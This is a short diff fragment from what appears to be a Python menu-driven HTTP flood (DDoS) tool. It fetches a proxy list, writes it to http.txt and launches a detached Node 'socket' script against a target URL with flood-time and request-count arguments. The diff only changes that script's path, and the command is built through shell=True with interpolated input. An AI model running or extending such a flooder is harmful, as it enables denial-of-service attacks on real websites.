@@ -75,7 +75,7 @@ class Home:
 						time.sleep(0.01)
 					with open("http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
-					subprocess.run([f'screen -dm node Method/socket {url} http.txt {floodtime} {reqs}'], shell=True)
+					subprocess.run([f'screen -dm node socket {url} http.txt {floodtime} {reqs}'], shell=True)
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option == '02' or option == '2':
